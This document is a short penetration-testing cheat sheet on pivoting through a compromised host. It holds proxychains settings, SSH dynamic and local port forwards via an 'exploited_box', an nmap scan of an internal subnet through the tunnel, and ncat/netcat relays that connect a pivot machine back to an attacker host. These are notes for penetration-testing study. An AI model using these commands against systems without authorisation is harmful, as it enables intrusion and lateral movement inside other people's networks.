### proxychains4.conf
```
...
strict_chain
...
# proxy_dns
...

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 8080
```


### dynamic port forward

```
ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>
sudo ssh -N -D 127.0.0.1:8080 root@exploited_box
cat /etc/proxychains.conf
socks4    127.0.0.1   8080
sudo proxychains nmap --top-ports=20 -sT -Pn subnet_box_accessed_via_exploited_box

```


### General port forwarding
```
ssh -N -L [bind_address:]port:host:hostport [username@address]
sudo ssh -N -L 0.0.0.0:445:TARGET.IP.ADDRESS:445 root@exploited_box
```

### Windows samba share
```
sudo nano /etc/samba/smb.conf
min protocol = SMB2
sudo /etc/init.d/smbd restart
smbclient -L 127.0.0.1 -U Administrator
```

### Ncat HTTP proxy

    $ ncat -vv --listen 3128 --proxy-type http

### Ncat Port Forwarder

#### On attacker machine:

    $ ncat -lv --broker -m2 <port>

#### On pivot machine:

    $ ncat -v <attacker_ip> <attacker_port> -c "ncat -v <host_to_pivot_to> <port_on_final_target"

### Netcat Port Forwarder

#### On pivot machine:

    mknod pivot p
    nc -l -p <port_to_listen_on> 0<pivot | nc <ip_to_pivot_to> <port_to_pivot_to> 1>pivot

### Proxychains Setup

#### Install and configure proxychains

    tail /etc/proxychains.conf
    #socks4 	127.0.0.1 9050
    http 172.21.0.3  3128
    #<type: http/socks4/socks5> <proxy_host> <proxy_port>


#### See also:

- HTTPTunnel-ing Through Deep Packet Inspection
- NETSH
- plink.exe
- SSH remote port forwarding
- SSH local port forwarding
- RINETD
- socat
- SShuttle
- cntlm
- netsh port forwarding
- [0xdf blog](https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html)
- [HighonCoffee](https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/)
